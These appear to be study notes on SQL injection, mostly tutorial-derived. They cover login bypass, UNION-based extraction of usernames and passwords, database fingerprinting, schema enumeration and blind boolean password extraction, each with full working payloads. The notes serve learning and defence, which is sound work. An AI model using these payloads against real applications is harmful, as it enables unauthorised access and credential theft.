## SQL injection in different parts of the query
Some other common locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.
The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

`https://insecure-website.com/products?category=Gifts'--`
So  the `Gifts'--` is considering like the term who be served on database.

This results in the SQL query:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Sql himsef add the first and the last `'` 
Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Method 1: ORDER BY Clause

1. **Injection Payload**: `' ORDER BY 1--`, `' ORDER BY 2--`, etc.
2. **Mechanism**: Modifies the original query to order by different columns.
3. **Error Detection**: When the column index exceeds the actual number of columns, the database returns an error.
4. **Response Indicators**: HTTP response may show the error, a generic error, or no results.

### Method 2: UNION SELECT with NULLs

1. **Injection Payload**: `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, etc.
2. **Mechanism**: Submits UNION SELECT queries with varying numbers of NULL values.
3. **Error Detection**: When the number of NULLs doesn't match the actual number of columns, the database returns an error.
4. **Response Indicators**: HTTP response may show the error, a generic error, no results, or additional content (like an extra row with NULL values).

Both methods aim to identify the number of columns by provoking an error or detecting a change in the response. The choice between the two depends on the specifics of the application and database behavior.
##### Database-specific syntax
On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.
There is a built-in table on Oracle called `dual` which can be used for this purpose.
`' UNION SELECT NULL FROM DUAL--`
The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

#### Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

###### Using a SQL injection UNION attack to retrieve interesting data
When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this example, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`

In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

### Retrieving multiple values within a single column
In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query contain all the usernames and passwords, for example:

`... administrator~s3cure wiener~peter carlos~montoya ...`

### Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.
### Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`


## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ``===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE`

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar`

This output shows the columns in the specified table and the data type of each column.



### Summary
**Summary: SQL Injection Techniques**

### Vulnerable Query Components
SQL injection can occur in different SQL statements, including:
- `UPDATE`: vulnerable in `SET` or `WHERE` clauses.
- `INSERT`: vulnerable in inserted values.
- `SELECT`: vulnerable in table/column names and `ORDER BY` clause.

### Basic SQL Injection Attack
A common attack form modifies the query by injecting SQL and commenting out the rest:
```plaintext
https://insecure-website.com/products?category=Gifts'--
```
This results in:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
This example bypasses any conditions after `--`, making all items (including unreleased ones) visible.

An alternate injection to display all categories:
```plaintext
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

### Authentication Bypass
Submitting `'administrator'--` as a username and leaving the password blank can bypass authentication:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

### UNION-Based SQL Injection
The `UNION` keyword can retrieve data from other tables if:
1. The same number of columns are selected.
2. Data types match across columns.
   - Example: `' UNION SELECT NULL, NULL--`.

**Finding Column Count:** Inject `ORDER BY` or `UNION SELECT NULLs` to determine column compatibility.

**Determining Column Data Types:** Test each column by placing a string (`'a'`) in individual columns:
```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
```

### Retrieving Sensitive Data
Once columns are identified, use `UNION` to extract data:
```sql
' UNION SELECT username, password FROM users--
```

For single-column queries, use string concatenation:
```sql
' UNION SELECT username || '~' || password FROM users--
```

### Database Type and Version Identification
Determine database type/version with provider-specific queries:
- **Microsoft SQL Server, MySQL**: `SELECT @@version`
- **Oracle**: `SELECT * FROM v$version`
- **PostgreSQL**: `SELECT version()`

### Listing Database Structure
Querying `information_schema` views (excluding Oracle):
- List tables: `SELECT * FROM information_schema.tables`
- List columns in `Users` table:
  ```sql
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
  ```

## What is blind SQL injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

### Exploiting blind SQL injection by triggering conditional responses
Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`…xyz' AND '1'='1 
`…xyz' AND '1'='2`


- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
#### Exploiting blind SQL injection by triggering conditional responses - Continued

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.